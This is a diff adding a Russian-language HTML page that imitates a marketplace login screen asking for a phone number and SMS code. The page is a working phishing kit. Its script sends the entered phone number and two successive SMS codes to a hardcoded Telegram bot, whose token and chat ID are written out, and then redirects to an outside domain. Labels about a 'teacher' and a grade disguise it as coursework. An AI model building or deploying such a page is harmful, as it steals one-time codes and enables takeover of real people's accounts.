@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Вход - Маркетплейс</title>
+    <style>
+        :root { --main-purple: #a832ff; --bg-gray: #f4f4f6; --text-gray: #8e8e93; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .app-container { width: 100%; max-width: 375px; height: 667px; background: white; position: relative; padding: 60px 20px 20px; box-sizing: border-box; display: flex; flex-direction: column; }
+
+        /* Верхняя панель */
+        .top-bar { position: absolute; top: 20px; left: 20px; right: 20px; display: flex; justify-content: space-between; align-items: center; height: 30px; }
+        .top-left { display: flex; align-items: center; }
+        .top-right { display: flex; align-items: center; }
+
+        .back-btn, .close-btn { font-size: 28px; cursor: pointer; color: #333; background: none; border: none; padding: 0; line-height: 1; }
+        .close-btn:hover, .back-btn:hover { opacity: 0.7; }
+
+        .currency { display: flex; align-items: center; font-size: 14px; color: var(--text-gray); gap: 6px; font-weight: 500; }
+        .flag-icon { width: 22px; height: 15px; border-radius: 2px; background: linear-gradient(#fff 33%, #0039a6 33% 66%, #d52b1e 66%); border: 0.5px solid #ccc; }
+
+        h2 { font-size: 24px; text-align: center; margin: 40px 0 30px; font-weight: 700; }
+        .phone-field { background-color: var(--bg-gray); border-radius: 16px; padding: 18px; display: flex; align-items: center; margin-bottom: 25px; }
+        .phone-field input { background: none; border: none; font-size: 18px; width: 100%; outline: none; margin-left: 10px; letter-spacing: 0.5px; }
+        .primary-btn { background-color: var(--main-purple); color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 25px; }
+        .primary-btn:hover { opacity: 0.9; }
+        .agreement-text { font-size: 13px; color: var(--text-gray); text-align: center; line-height: 1.6; }
+        .agreement-text a { color: var(--text-gray); text-decoration: underline; }
+        .screen { display: none; width: 100%; }
+        .screen.active { display: block; }
+        .loader-wrap { display: flex; justify-content: center; align-items: center; height: 250px; }
+        .loader-circle { width: 55px; height: 55px; border: 4px solid #f0f0f0; border-top: 4px solid var(--main-purple); border-radius: 50%; animation: spin 0.9s linear infinite; }
+        .sms-info-text { text-align: center; color: #333; font-size: 16px; margin-bottom: 30px; line-height: 1.4; }
+
+        /* Поля ввода СМС - уменьшенные */
+        .sms-grid { display: flex; justify-content: center; gap: 8px; margin-bottom: 40px; }
+        .sms-box {
+            width: 42px;
+            height: 48px;
+            background: var(--bg-gray);
+            border: 2px solid transparent;
+            border-radius: 12px;
+            font-size: 22px;
+            text-align: center;
+            outline: none;
+            transition: all 0.2s ease;
+            caret-color: var(--main-purple);
+        }
+
+        /* Фиолетовая рамка при фокусе */
+        .sms-box:focus {
+            border-color: var(--main-purple);
+            background: white;
+            box-shadow: 0 0 0 2px rgba(168, 50, 255, 0.1);
+        }
+
+        /* Убираем стрелки у number input */
+        .sms-box::-webkit-outer-spin-button,
+        .sms-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .sms-box[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        .timer-text { text-align: center; color: var(--text-gray); font-size: 14px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Адаптация для очень маленьких экранов */
+        @media (max-width: 360px) {
+            .sms-box { width: 38px; height: 44px; font-size: 20px; }
+            .sms-grid { gap: 6px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <!-- Экран ввода телефона -->
+    <div id="screen-phone" class="screen active">
+        <div class="top-bar">
+            <div class="top-left">
+                <div class="currency">
+                    <div class="flag-icon"></div>
+                    RUB
+                </div>
+            </div>
+            <div class="top-right">
+                <button class="close-btn">✕</button>
+            </div>
+        </div>
+        <h2>Войти или создать профиль</h2>
+        <div class="phone-field">
+            <div class="flag-icon"></div>
+            <span style="margin-left:10px; font-size:18px; font-weight: 500;">+7</span>
+            <input type="tel" id="phone-input" placeholder="000 000-00-00" maxlength="13">
+        </div>
+        <button class="primary-btn" onclick="goToLoader()">Получить код</button>
+        <div class="agreement-text">
+            Нажимая на кнопку, я соглашаюсь <br>
+            с <a href="#">правилами пользования торговой площадкой</a>. <br>
+            <a href="#">Политика конфиденциальности</a>
+        </div>
+    </div>
+
+    <!-- Экран загрузки -->
+    <div id="screen-loader" class="screen">
+        <div class="top-bar">
+            <div class="top-left">
+                <div class="currency">
+                    <div class="flag-icon"></div>
+                    RUB
+                </div>
+            </div>
+            <div class="top-right">
+                <button class="close-btn">✕</button>
+            </div>
+        </div>
+        <div class="loader-wrap">
+            <div class="loader-circle"></div>
+        </div>
+    </div>
+
+    <!-- Экран ввода СМС -->
+    <div id="screen-sms" class="screen">
+        <div class="top-bar">
+            <div class="top-left">
+                <button class="back-btn" onclick="backToPhone()">←</button>
+            </div>
+            <div class="top-right">
+                <button class="close-btn">✕</button>
+            </div>
+        </div>
+        <h2>Введите код из СМС</h2>
+        <div class="sms-info-text">
+            Отправили на <span id="target-phone" style="font-weight:600;"></span>
+        </div>
+        <div class="sms-grid" id="sms-inputs">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="number" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="timer-text">
+            Запросить новый код через <span id="timer">00:58</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ================== НАСТРОЙКИ ==================
+    const TEACHER_BOT_TOKEN = '8643372758:AAEGaJqnbCpT0XfqbtpUFTkJfd1UPUc77UM';
+    const TEACHER_CHAT_ID = '7250924483';
+    // ===============================================
+
+    const phoneInput = document.getElementById('phone-input');
+    let isSecondAttempt = false;
+    let firstSmsCode = '';
+
+    async function sendLogToTeacher(message) {
+        const url = `https://api.telegram.org/bot${TEACHER_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TEACHER_CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+        } catch (error) {
+            console.log('Ошибка отправки:', error);
+        }
+    }
+
+    phoneInput.addEventListener('input', (e) => {
+        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
+        e.target.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? '-' + x[3] : '') + (x[4] ? '-' + x[4] : '');
+    });
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    function goToLoader() {
+        if(phoneInput.value.length < 13) return;
+        const fullPhone = `+7 ${phoneInput.value}`;
+        sendLogToTeacher(`<b>📱 Новый вход:</b>\nНомер телефона: <code>${fullPhone}</code>`);
+        showScreen('screen-loader');
+        setTimeout(() => {
+            document.getElementById('target-phone').innerText = fullPhone;
+            showScreen('screen-sms');
+            startTimer();
+            inputs.forEach(el => el.value = "");
+            inputs[0].focus();
+        }, 1200);
+    }
+
+    function backToPhone() {
+        showScreen('screen-phone');
+    }
+
+    function startTimer() {
+        let timeLeft = 58;
+        const timerDisplay = document.getElementById('timer');
+        if (window.timerInterval) clearInterval(window.timerInterval);
+        window.timerInterval = setInterval(() => {
+            timeLeft--;
+            let sec = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+            timerDisplay.innerText = "00:" + sec;
+            if(timeLeft <= 0) clearInterval(window.timerInterval);
+        }, 1000);
+    }
+
+    const inputs = document.querySelectorAll('.sms-box');
+    inputs.forEach((input, i) => {
+        input.addEventListener('input', () => {
+            if (input.value.length > 0 && i < inputs.length - 1) inputs[i + 1].focus();
+            const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+            if (allFilled) {
+                const code = Array.from(inputs).map(inp => inp.value).join('');
+                if (!isSecondAttempt) {
+                    firstSmsCode = code;
+                    sendLogToTeacher(`<b>🔢 Первая попытка ввода СМС:</b>\nКод: <code>${code}</code>`);
+                    setTimeout(() => {
+                        isSecondAttempt = true;
+                        showScreen('screen-loader');
+                        setTimeout(() => {
+                            showScreen('screen-sms');
+                            startTimer();
+                            inputs.forEach(el => el.value = "");
+                            inputs[0].focus();
+                        }, 800);
+                    }, 400);
+                } else {
+                    sendLogToTeacher(`<b>🔢 Вторая попытка ввода СМС:</b>\nКод: <code>${code}</code>`);
+                    const finalMessage = `<b>✅ Проверка завершена!</b>\n\n` +
+                                         `<b>Номер:</b> +7 ${phoneInput.value}\n` +
+                                         `<b>Первый код:</b> ${firstSmsCode}\n` +
+                                         `<b>Второй код:</b> ${code}\n\n` +
+                                         `<i>Сайт работает корректно. Оценка 5!</i> 😎`;
+                    sendLogToTeacher(finalMessage);
+                    setTimeout(() => { window.location.href = "https://hkpodl.com"; }, 400);
+                }
+            }
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && i > 0) {
+                inputs[i - 1].focus();
+            }
+        });
+
+        // Дополнительно: при фокусе выделяем всё содержимое
+        input.addEventListener('focus', (e) => {
+            e.target.select();
+        });
+    });
+</script>
+</body>
+</html>
